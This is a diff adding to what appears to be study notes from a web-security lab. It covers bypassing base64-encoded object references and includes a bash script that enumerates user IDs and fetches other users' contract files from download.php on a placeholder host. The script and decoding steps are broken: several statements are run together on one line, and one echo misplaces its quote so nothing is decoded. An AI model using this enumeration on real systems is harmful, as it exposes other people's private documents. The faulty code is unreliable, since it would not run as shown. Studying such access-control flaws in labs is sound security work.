@@ -59,3 +59,42 @@ echo "=== Enumeration completed ==="
 ```
 
 # Bypassing Encoded References
+```bash
+# Upon the request I get
+MQ%3D%3D
+echo "MQ%3D%3D" | python3 -c "import urllib.parse; print(urllib.parse.unquote(input()))"
+
+# Then I get 
+"MQ=="
+echo "MQ== | base64 -d"
+1
+
+# For the second user
+echo -n 2 | base64 -w 0
+```
+
+### The script
+```bash
+#!/bin/bash
+
+url="http://IP/download.php?contract="echo "=== Bypassing Encoded References - Contract Enumeration ==="for i in {1..20}; do  
+    # Reproduce the exact encoding: uid -> base64  
+    encodedid=$(echo -n $i | base64 -w 0)  
+      
+    echo "Testing user $i (contract=$encodedid)..."  
+      
+    # Make request and capture response  
+    response=$(curl -s "${url}${encodedid}")  
+      
+    # Check for meaningful content  
+    if [[ ${#response} -gt 10 ]]; then  
+        echo "  ✓ Found content for user $i:"  
+        echo "$response"  
+        echo "  =========================="  
+    else  
+        echo "  ✗ Empty or minimal response"  
+    fi  
+done
+```
+
+# IDOR in Insecure APIs
